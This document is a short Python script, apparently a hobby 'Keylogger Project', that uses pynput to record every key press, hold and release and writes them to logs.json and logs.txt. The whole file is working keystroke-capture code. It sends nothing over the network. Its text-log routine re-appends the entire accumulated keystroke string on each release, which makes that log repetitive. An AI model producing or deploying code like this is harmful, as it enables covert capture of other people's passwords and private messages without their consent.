import tkinter as tk
from tkinter import *
from pynput import keyboard
import json

root = tk.Tk()
root.geometry("150x200")
root.title("Keylogger Project")

key_list = []
x = False
key_strokes = ""

def update_txt_file(key):
    with open('logs.txt', 'a+') as f:
        f.write(key + '\n')

def update_json_file(key_list):
    with open('logs.json', 'w+') as f:
        json.dump(key_list, f)

def on_press(key):
    global x, key_list
    if x is False:
        key_list.append({'Pressed': f'{key}'})
        x = True
    else:
        key_list.append({'Held': f'{key}'})
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append({'Released': f'{key}'})
    x = False
    update_json_file(key_list)

    key_strokes += str(key) + '\n'
    update_txt_file(key_strokes)

print("[+] Running Keylogger Successfully!\n[!] Saving the key logs in 'logs.json'")

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()
